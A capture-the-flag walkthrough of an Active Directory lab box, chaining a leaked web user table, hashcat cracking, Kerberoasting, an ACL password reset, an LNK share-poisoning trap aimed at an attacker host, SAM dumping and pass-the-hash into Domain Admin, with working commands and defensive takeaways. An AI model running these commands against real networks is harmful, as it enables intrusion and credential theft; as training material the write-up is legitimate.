---
title: "BuildingMagic — Active Directory Walkthrough: Web Leak to Domain Admin"
description: "Full Active Directory walkthrough of BuildingMagic (Windows Server 2022) — chaining a web DB leak, Kerberoasting, ACL abuse, share poisoning, and Pass-the-Hash into Domain Admin."
date: 2026-07-05 11:00:00 +0000
categories: [Active Directory]
tags: [active-directory, kerberoasting, acl-abuse, pass-the-hash, bloodhound, oscp]
difficulty: Hard
---

> **Box:** Active Directory (Hack Smarter / OSCP-style) · **OS:** Windows Server 2022 · **Domain:** BUILDINGMAGIC.LOCAL · **Theme:** Web DB leak → Kerberoast → ACL abuse → share poisoning → Pass-the-Hash

BuildingMagic is a full-length Active Directory chain and probably the most satisfying box in this set — it strings together half a dozen classic AD techniques into one clean path from an anonymous web portal all the way to Domain Admin. (It's Harry Potter–themed, so expect a lot of familiar surnames.)

## Recon

```bash
rustscan -a 10.0.27.163 -- -A
```

Standard domain-controller port set — DNS, Kerberos, LDAP, SMB, WinRM, ADWS — with two things worth noting: **SMB signing is enabled** (so no easy relay), and there's a **web app on 8080**. The LDAP/RDP certs gave me the domain **BUILDINGMAGIC.LOCAL** and host **DC01**. Into `/etc/hosts` they went.

```bash
curl -s http://10.0.27.163:8080/   # "Building Magic Application Portal" (Werkzeug/Python)
```

## Initial Foothold — leaked database

A null SMB session was allowed but gave up nothing useful, and the box wasn't vulnerable to the usual named CVEs. The way in was the **Building Magic Application Portal** on 8080, which leaked its backend user table — ten employees, each with an **MD5** password hash:

```text
r.widdleton, n.bottomsworth, l.layman, c.smith, d.thomas,
s.winnigan, p.jackson, b.builder, t.ren, e.macmillan
```

I dropped the hashes into a file and ran them through hashcat as raw MD5:

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

One fell:

```text
r.widdleton : lilronron
```

## Domain Enumeration

Those creds validated over SMB, so I mapped shares and ran a full BloodHound collection to understand the domain:

```bash
nxc smb BUILDINGMAGIC.LOCAL -u 'r.widdleton' -p 'lilronron' --shares
nxc ldap 10.0.27.163 -u 'r.widdleton' -p 'lilronron' --bloodhound --collection All --dns-server 10.0.27.163
```

## Kerberoasting → r.haggard

With a valid account I requested service tickets for any Kerberoastable SPNs:

```bash
impacket-GetUserSPNs buildingmagic.local/r.widdleton:lilronron -dc-ip 10.0.27.163 -request -outputfile kerberoast.hashes
```

That returned a TGS for **r.haggard**, which hashcat cracked in seconds:

```bash
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
# r.haggard : rubeushagrid
```

## ACL Abuse — targeted password reset

BloodHound was the key here: **r.haggard** held rights over the account **H.POTCH**, which meant I could force-reset its password. `net rpc` made that a one-liner:

```bash
net rpc password "H.POTCH" "cyber@123" -U "buildingmagic.local"/"r.haggard"%"rubeushagrid" -S 10.0.27.163
```

And the payoff — H.POTCH has **READ/WRITE** on the `File-Share`:

```bash
nxc smb 10.0.27.163 -u 'H.POTCH' -p 'cyber@123' --shares
# File-Share   READ,WRITE   Central Repository of Building Magic's files.
```

## Share Poisoning → h.grangon

A writable file share that other users browse is a forced-authentication goldmine. I planted a malicious shortcut on it with netexec's `slinky` module and caught the incoming NTLM authentication with Responder:

```bash
nxc smb 10.0.27.163 -u 'H.POTCH' -p 'cyber@123' -M slinky -o SERVER=<attacker-ip> SHARES=File-Share NAME=systemd
# [+] Created LNK file on the File-Share share
```

When a user's Explorer rendered the folder, their machine reached out to me — yielding the next set of creds, **h.grangon : magic4ever**.

## User Flag

h.grangon had WinRM access, so I logged straight in:

```bash
evil-winrm -i DC01.BUILDINGMAGIC.LOCAL -u h.grangon -p 'magic4ever'
*Evil-WinRM* PS C:\Users\h.grangon\Desktop> type user.txt
# 701b51527b6d4105d9b16b412af2d604
```

## Privilege Escalation → Domain Admin (Pass-the-Hash)

From the h.grangon shell I dumped the local SAM and SYSTEM hives, pulled them down, and extracted the hashes offline:

```powershell
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
download sam
download system
```

```bash
impacket-secretsdump -system system -sam sam LOCAL
# Administrator:500:...:520126a03f5d5a8d836f1c4f34ede7ce:::
```

That local **Administrator NT hash** was the finish line — a straight Pass-the-Hash gave code execution as admin, and the root flag:

```bash
nxc smb <target-ip> -u A.flatch -H 520126a03f5d5a8d836f1c4f34ede7ce -x 'type C:\users\Administrator\desktop\root.txt'
# (Pwn3d!)
# 9557e65743416cfadadfb17f89b8651b
```

## Takeaways

- **App DB leaks seed the whole chain.** One exposed user table with weak MD5 hashes was the single foothold that unlocked everything else.
- **Kerberoasting punishes weak service-account passwords.** `rubeushagrid` should never have survived rockyou.
- **BloodHound turns noise into a path.** The r.haggard → H.POTCH reset right isn't obvious by hand — the graph makes it a click.
- **Writable shares = forced auth.** A share other users browse plus write access equals credential capture via a planted shortcut.
- **Defensive fixes:** don't expose backend databases through app endpoints, salt/stretch password storage, enforce strong service-account passwords (or gMSAs), audit dangerous ACLs, and lock down write permissions on shared folders.
